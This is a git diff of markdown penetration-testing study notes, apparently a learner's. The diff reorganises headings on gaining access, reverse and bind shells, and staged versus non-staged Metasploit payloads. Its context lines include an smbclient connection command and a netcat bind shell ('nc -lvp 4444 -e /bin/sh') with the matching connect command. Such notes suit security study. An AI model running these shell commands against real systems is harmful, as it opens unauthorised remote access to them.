@@ -116,8 +116,10 @@ smbclient \\\\{IP address}\\{repository name}
 ```
 > if the prompt changes and you have `smb: \>` you're in and you can try any SMB command
 #### ssh (22) 
-## Exploitation Basics
-### Reverse and Bind shell
+
+## Gaining Access
+### Exploitation Basics
+#### Reverse and Bind shell
 To perform these attacks, we use the `nc` command (*netcat*). 
 In reverse shell, the attacker sets up a listener on a specific port and the target connects his machine to the attacker's like this :
 ```bash
@@ -141,26 +143,26 @@ nc -lvp 4444 -e /bin/sh
 # Attacker's machine
 nc 192.168.156.2 4444
 ```
-### Non-staged and Staged payload
-#### Non-staged payload
+#### Non-staged and Staged payload
+##### Non-staged payload
 Sends a shellcode all at once. It's larger than staged payload and does not always work. 
 You can recognize them in Metasploit like this: `windows/meterpreter_reverse_tcp`
-#### Staged payload
+##### Staged payload
 Sends a payload in staged. It's less stable. 
 You can recognize them in Metasploit like this: `windows/meterpreter/reverse_tcp`
 Notice the `/`replacing the `_` in the non-staged payload.
-## Gaining Access
+### 
 ## Maintaining Access
 ## Covering Tracks
 
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjAzNDg2NDI3MSwxNjc3NDUyMTcwLDE4MT
-gxNzYyMTksLTEwOTc4OTE4MTMsMjA1NDE3MDg1NCwxNTM0Njky
-MjU0LC0zNjMxNjIwMDksNDkyODkxMzU0LC0xNDk4MjMxMDEsMT
-g2NTYyMjgxMCwtMjA4MTQ2MzIxNCwtMTAxODM2MjY3LC00NzQ5
-OTA5ODgsLTE0NzMxMTUzNiwtMTI0NDE5NzI5OCw3NjI3ODIxNj
-IsLTE4MzEzMzk4OSw0NjIwMjY2NzUsLTExNzY5NTc2OTMsLTEw
-MDc1MTIyMDhdfQ==
+eyJoaXN0b3J5IjpbLTEwMjYyMzgzNDEsMjAzNDg2NDI3MSwxNj
+c3NDUyMTcwLDE4MTgxNzYyMTksLTEwOTc4OTE4MTMsMjA1NDE3
+MDg1NCwxNTM0NjkyMjU0LC0zNjMxNjIwMDksNDkyODkxMzU0LC
+0xNDk4MjMxMDEsMTg2NTYyMjgxMCwtMjA4MTQ2MzIxNCwtMTAx
+ODM2MjY3LC00NzQ5OTA5ODgsLTE0NzMxMTUzNiwtMTI0NDE5Nz
+I5OCw3NjI3ODIxNjIsLTE4MzEzMzk4OSw0NjIwMjY2NzUsLTEx
+NzY5NTc2OTNdfQ==
 -->
